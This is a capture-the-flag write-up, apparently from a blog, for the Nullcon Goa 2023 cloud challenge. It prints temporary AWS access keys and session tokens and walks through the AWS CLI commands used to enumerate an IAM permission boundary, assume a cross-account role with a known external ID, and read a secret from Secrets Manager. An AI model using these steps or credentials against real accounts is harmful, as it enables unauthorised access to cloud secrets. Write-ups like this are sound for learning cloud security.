---
title: Nullcon GOA 2023 - Cloud Writeup
date: 2023-08-20
subtitle: 
tags: [cloud]
---

![](/images/ctfs/nullcon23/cloud01.png)

Upon accessing the URL of the provided lambda function in the challenge, we obtain an `aws_access_key_id`, an `aws_secret_access_key`, and an `aws_session_token`. These can serve as temporary credentials, enabling the execution of diverse actions on AWS via the AWS CLI. To preserve these credentials, they can be stored within the `~/.aws/credentials` file, subsequently establishing a default profile for accessing various stuff in the corresponding AWS account.

```bash
[default]
aws_access_key_id = ASIA22D7J5LENPGOPGKK

aws_secret_access_key = M9Pk83kHISFJEyjL14CsChMmqPPrVYEPjdTsHBj/

aws_session_token=IQoJb3JpZ2luX2VjEP7//////////wEaDGV1LWNlbnRyYWwtMSJIMEYCIQCpzuoryvRZOidlgMUpF/tKHDfAJ95ijXp/vCsYJkzb+wIhAIGKXD/PuOJYTY7cD7B+tFlaqin7vsXdAr8Y2MKNjhYyKoQDCLj//////////wEQABoMNzQzMjk2MzMwNDQwIgwZm1n60xqjsidKesUq2AJGAeJ2xJ1j4cm47qx/iTRu1eEN9NHhZFT17SFJdgImibVSmnCuIJv6YtPqrk0A5zodJNgNIaWUp6SHszNTU9hvOefsxN9FvF7CLXjpmHES+V0tpCtgqpsrzLLS5t/Eo/HNOP1iFGe6jKIBLsYrxo+mGvFBiWt6Yj7B1Q476Bj33t6Q+lLVNPRtPPAqeNfnGl5ICcB/fVsIgO8axsGVBaZy6T1p6GFMjeKogL+DFUWA/y7kkjB9zW6mE+w2yDRnyO7PCXKYUwKWgYOCnz1DuM/ZXP8Y6Ji2p5mOOQ2mKhAwPzPMwU3bGPI8UXBCGtIKP99sAQUdWV1qeeSKY48/84vuduPcXoiI2mlEO3K6omRiMP21r9yjUVG4ZkRNS/OQIPBvcXZWK5FWWRp0s/EAK/IuGVtrsyzrd3qggEJeMd3daUr4wYguaefhrmDuBV4j3QVjoCyIna5XnDCk44anBjqdAbwSepTzpvEGNN4fBd0O/zwzLn18i9foVqclFxMpiyGSIrml43rbInaz4t97plLA8ej4tIuw/x2VvoVxBksrHSZxX75DMFuoB9OSTJzCmdtXQvQToEXp7bOYAsTKRaOIQ2v8wzSww7libFY7vyGQ6EGLKRK9wZueuzCsMadwIx82M+OrSQK/nV/2cqHy76UqbvoWFDJ78CMWKHRbO9s=

```
Let's get started by fetching details about the IAM entity corresponding to these credentials.

```bash
aws sts get-caller-identity
```
![](/images/ctfs/nullcon23/cloud02.png)

This gives us the role name `role_for-lambda-to-assume-role`. Let's proceed by retrieving some information about this role.

```sh
aws iam get-role --role-name role_for-lambda-to-assume-role
```

![](/images/ctfs/nullcon23/cloud03.png)

Here, we quickly spot that there's a permission boundary attached to this role.
```json
"PermissionsBoundary": {
    "PermissionsBoundaryType": "Policy",
    "PermissionsBoundaryArn": "arn:aws:iam::743296330440:policy/permission-boundary_restrict-assumptions"
}
```
According to AWS docs, a permission boundary uses an AWS or customer managed policy to restrict access to resources that can be accessed by an IAM entity. It is nothing but a policy. We can view information about this policy through its ARN by running the following command.

```sh
aws iam get-policy --policy-arn arn:aws:iam::743296330440:policy/permission-boundary_restrict-assumptions
```

![](/images/ctfs/nullcon23/cloud04.png)


The version id holds paramount significance in this response. This version id can be utilized in conjunction with the policy arn to extract the policy document.
```json
{
    "Policy": {
        "PolicyName": "permission-boundary_restrict-assumptions",
        ....
        ....
        "DefaultVersionId": "v9",
        ....
        ....
        
    }
}
```
```sh
aws iam get-policy-version --policy-arn arn:aws:iam::743296330440:policy/permission-boundary_restrict-assumptions --version-id v9
```

This gives us the actual policy document represented by the permission boundary.
```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetRole",
                        "iam:ListAttachedRolePolicies"
                    ],
                    "Resource": [
                        "arn:aws:iam::743296330440:role/role_for-lambda-to-assume-role"
                    ]
                },
                {
                    "Sid": "VisualEditor3",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:GetRolePolicy"
                    ],
                    "Resource": [
                        "arn:aws:iam::743296330440:policy/permission-boundary_restrict-assumptions",
                        "arn:aws:iam::743296330440:policy/policy_role-lambda-sts-assume-all"
                    ]
                },
                {
                    "Sid": "VisualEditor2",
                    "Effect": "Allow",
                    "Action": "sts:AssumeRole",
                    "Resource": "arn:aws:iam::*:role/role_to_secretsmanager_read_flag",
                    "Condition": {
                        "StringEquals": {
                            "sts:ExternalId": "nullcon-external-id"
                        }
                    }
                }
            ]
        },
        "VersionId": "v9",
        "IsDefaultVersion": true,
        "CreateDate": "2023-08-17T20:54:35Z"
    }
}
```

In this context, it is evident that the policy grants permission for sts:AssumeRole on the specified resource `arn:aws:iam::*:role/role_to_secretsmanager_read_flag`, contingent upon the condition that the external id is set to `nullcon-external-id`. Now, let's carry out this operation within the account provided in the challenge description, namely `562778112707`.

```bash
aws sts assume-role --role-arn "arn:aws:iam::562778112707:role/role_to_secretsmanager_read_flag" --role-session-name lambda --external-id nullcon-external-id
```
![](/images/ctfs/nullcon23/cloud05.png)

This gives us a new set of temporary credentials. We can save this information in `~/.aws/credentials` and create a new profile, let's say `shady`.

```
[shady]
aws_access_key_id = ASIAYGCBQQLBQQORZXFB
aws_secret_access_key = rG47I7mbjFhbJCWRqyI27iBYUsHl5vJtMD1q9HK+
aws_session_token = FwoGZXIvYXdzEBAaDGmOzkOkaI57boODnSKqAb5jf4sxmEFQTtZyHmwOKl8uW5ma89dpcVuODV6yn/+077pcqXGlYgIU/UQJVAhIq034eu+O2LQ4AYWLPh/UM1fixaRI5qXERR9JTm7/dN3mJA240/LbB9mP7et4kqyZXJclAG/YCEYx4LRQsofq+kvtuRMkaN/ogxMpXL7vo8ypy3awNgmipCl926awCC/3Z0fv/WCPTZmEP+FbIQ4nxQWiLOMsf68wfuVhKOPphqcGMi3FeJKZcBAsn9oI4Boairx1Z7PuaxIfKuu2diaS9AfcpulVroG5mG6h/EyAY9c=

```

Finally, let's read the secrets from AWS Secrets Manager by using the information provided in the challenge description.
```sh
aws --profile shady secretsmanager get-secret-value --secret-id secret-flag-Educated-Assumption --region eu-central-1
```
![](/images/ctfs/nullcon23/cloud06.png)

